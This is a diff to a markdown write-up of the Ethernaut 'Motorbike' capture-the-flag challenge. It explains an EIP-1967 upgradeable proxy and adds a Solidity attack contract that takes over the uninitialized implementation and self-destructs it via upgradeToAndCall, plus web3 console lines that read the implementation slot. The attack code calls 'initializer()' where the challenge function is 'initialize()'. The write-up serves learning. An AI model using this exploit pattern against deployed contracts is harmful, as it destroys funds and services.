@@ -116,21 +116,21 @@ Challenge's message:
 > Ethernaut's motorbike has a brand new upgradeable engine design. Would you be able to selfdestruct its engine and make the motorbike unusable ?
 
 
-This set of Solidity contracts demonstrates a simple upgradeability pattern using EIP-1967, which enables you to upgrade the logic of a smart contract while maintaining its storage and state. EIP-1967 introduces a proxy contract that delegates calls to an implementation contract. This allows you to upgrade the implementation without changing the proxy contract's address or the storage layout.
+This set of Solidity contracts demonstrates a simple upgradeability pattern using **EIP-1967**, which enables you to upgrade the logic of a smart contract while maintaining its storage and state. EIP-1967 introduces a proxy contract that delegates calls to an implementation contract. **This allows you to upgrade the implementation without changing the proxy contract's address or the storage layout**.
 
 
 The `Motorbike` contract is a proxy contract that delegates function calls to its implementation. Here's how it works:
 
 - **Initialization**: The constructor of `Motorbike` takes an address `_logic` as an argument, which represents the initial implementation contract. It checks if `_logic` is a valid contract address using the `Address.isContract()` function from OpenZeppelin. Then, it sets the `_IMPLEMENTATION_SLOT` to the `_logic` address. After that, it attempts to delegate call the `initialize()` function of the `_logic` contract.
 
- - **Delegation**: The `fallback` function of the `Motorbike` contract is triggered when an unknown function is called on the proxy contract. It delegates the call to the current implementation by using the address stored in the `_IMPLEMENTATION_SLOT`.
+ - **Delegation**: The `fallback` function of the `Motorbike` contract is triggered when an unknown function is called on the proxy contract. **It delegates the call to the current implementation by using the address stored in the** `_IMPLEMENTATION_SLOT`.
 
 
 The `Engine` contract is the implementation contract meant to be used with the `Motorbike` proxy. It inherits from `Initializable`, which is a part of the OpenZeppelin library.
 
 - **Initialization**: The `initialize()` function initializes the contract state. It sets the `horsePower` to 1000 and the `upgrader` to the sender's address.
 
-- **Upgrade and Call**: The `upgradeToAndCall()` function is used to upgrade the implementation of the proxy and execute a function on the new implementation. This function requires the sender to have the `upgrader` role. It calls `_authorizeUpgrade()` to ensure the sender is authorized. Then, it upgrades the implementation using `_upgradeToAndCall()`. If `data` is provided, it delegates calls to the new implementation with the provided data.
+- **Upgrade and Call**: The `upgradeToAndCall()` function is used to upgrade the implementation of the proxy and execute a function on the new implementation. This function requires the sender to have the `upgrader` role. It calls `_authorizeUpgrade()` to ensure the sender is authorized. Then, it upgrades the implementation using `_upgradeToAndCall()`. If `data` is provided, **it delegates calls to the new implementation with the provided data**.
 
 - **Authorization Check**: The `_authorizeUpgrade()` function restricts the upgrade functionality to the `upgrader` role. If the sender is not the `upgrader`, the upgrade is denied.
 
@@ -141,13 +141,46 @@ The `Engine` contract is the implementation contract meant to be used with the `
 
 This set of contracts implements a basic upgradeability pattern using EIP-1967, where a proxy contract (`Motorbike`) delegates calls to an implementation contract (`Engine`). The `Engine` contract can be upgraded by an authorized upgrader using the `upgradeToAndCall()` function. This enables the contract's logic to be upgraded while retaining its storage and state.
 
+##	ERC-1967
+
+## Uninitialized UUPS Proxy Implementation
+
+
 # Subverting
 
 
 ```solidity
+pragma solidity ^0.8.20;
 
+interface IEngine{
+    function upgrader() external view returns(address);
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+    function initializer() external;
+}
+
+contract Attack {
+
+    function attack(IEngine target) external{
+        target.initializer();
+        bytes memory data = abi.encodeWithSignature("pwn()");
+        target.upgradeToAndCall(address(this),data);
+    }
+
+    function pwn() external {
+        selfdestruct(payable(address(0)));
+    }
+}
 ```
 
+```js
+address = await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
+'0x000000000000000000000000c886bb58a9ef8f390296cb8ad0529c0f00b13155'
+```
+
+```js
+address = '0x' + address.slice(-40)
+'0xc886bb58a9ef8f390296cb8ad0529c0f00b13155'
+```
 
 Ethernaut's message:
 
